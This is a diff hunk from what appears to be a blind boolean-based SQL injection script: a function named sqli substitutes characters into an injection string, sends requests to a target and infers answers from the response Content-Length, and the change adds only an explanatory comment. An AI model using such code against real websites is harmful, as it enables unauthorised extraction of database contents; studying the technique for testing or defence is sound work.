@@ -7,6 +7,7 @@ def sqli(entry_point, inj_str, true_len):
         target = entry_point + inj_str.replace("[CHAR]", str(j)) 
         r = requests.get(target)
         # Checking response for boolean answer
+        # In case query text will be inserted into response, result might be greater than True measured length
         if int(r.headers['Content-Length']) >= true_len :
             return j 
     return None
